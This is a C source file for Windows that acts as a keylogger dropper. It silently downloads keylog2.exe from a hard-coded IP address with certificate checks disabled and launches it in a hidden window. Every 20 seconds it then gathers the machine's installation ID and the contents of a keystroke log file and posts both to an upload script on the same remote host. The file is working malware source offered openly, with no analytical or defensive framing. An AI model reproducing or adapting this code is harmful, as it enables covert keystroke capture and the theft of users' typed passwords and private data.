#if defined(UNICODE) && !defined(_UNICODE)
    #define _UNICODE
#elif defined(_UNICODE) && !defined(UNICODE)
    #define UNICODE
#endif

#include <tchar.h>
#include <windows.h>
#define CURL_STATICLIB
#include <direct.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
// curl-7.40.0-devel-mingw32
#include <curl/curl.h>
#define POST_SIZE 2048
int mkdir(const char *);
char filename[FILENAME_MAX] = "C:\\tmp\\keylog2.exe";
size_t callback_file(void *, size_t , size_t , FILE *);

int WINAPI WinMain (HINSTANCE hThisInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR lpszArgument,
                     int nCmdShow)
{
    char *url = "https://120.125.80.141/opgs/agent/mission/keylog2.exe";
    char *url2 = "https://120.125.80.141/opgs/agent/keylog_upload.php";
    char agent[] = "opgs/1.1";
    FILE *fp;
    _mkdir("C:\\tmp");

    CURL *curl;
    fp = fopen(filename,"wb");
    curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, agent);
    curl_easy_setopt(curl, CURLOPT_HEADER, 0L);
    curl_easy_setopt(curl, CURLOPT_POST,1L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, callback_file);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
    curl_easy_perform(curl);
    fclose(fp);
    curl_easy_cleanup(curl);

    SHELLEXECUTEINFO ShExecInfo = {0};
    ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
    ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
    ShExecInfo.hwnd = NULL;
    ShExecInfo.lpVerb = NULL;
    ShExecInfo.lpFile = "cmd.exe";
    ShExecInfo.lpParameters = "/c start C:\\tmp\\keylog2.exe";
    ShExecInfo.lpDirectory = NULL;
    ShExecInfo.nShow = SW_HIDE;
    ShExecInfo.hInstApp = NULL;
    ShellExecuteEx(&ShExecInfo);
    WaitForSingleObject(ShExecInfo.hProcess,INFINITE);

    while(1)
    {
        Sleep(20000);

        char install_id[128];
        char line[1024];
        char log[2048];
        char keylog[2048];
        char cmd[256];
        char *callback;
        char postdata[POST_SIZE];

        sprintf(cmd,"/c %s %s > C:\\tmp\\key.txt",
            "%windir%\\Sysnative\\cscript %windir%\\System32\\slmgr.vbs /dlv",
            "| %windir%\\Sysnative\\findstr \"¦w¸ËÃÑ§O½X\"");
        SHELLEXECUTEINFO ShExecInfo = {0};
        ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
        ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
        ShExecInfo.hwnd = NULL;
        ShExecInfo.lpVerb = NULL;
        ShExecInfo.lpFile = "cmd.exe";
        ShExecInfo.lpParameters = cmd;
        ShExecInfo.lpDirectory = NULL;
        ShExecInfo.nShow = SW_HIDE;
        ShExecInfo.hInstApp = NULL;
        ShellExecuteEx(&ShExecInfo);
        WaitForSingleObject(ShExecInfo.hProcess,INFINITE);

        fp = fopen("C:\\tmp\\key.txt", "r");
        fgets(line,1024,fp);
        sscanf(line,"%*s %s",install_id);
        fclose(fp);

        fp = fopen("C:\\tmp\\keylog.txt", "r");
        fgets(log,2048,fp);
        sscanf(log,"%s",keylog);
        fclose(fp);

        sprintf(postdata,"install_id=%s&keylog=%s",install_id,keylog);
        curl = curl_easy_init();
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_URL, url2);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, agent);
        curl_easy_setopt(curl, CURLOPT_HEADER, 0L);
        curl_easy_setopt(curl, CURLOPT_POST,1L);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS,postdata);
        callback = (char *)curl_easy_perform(curl);



    }
    //hellExecute(NULL,NULL,"cmd.exe","/c start C:\\tmp\\keylog2.exe",NULL,SW_HIDE);
}

size_t callback_file(void *ptr, size_t size, size_t nmemb, FILE *stream)
{
    size_t written = fwrite(ptr, size, nmemb, stream);
    return written;
}

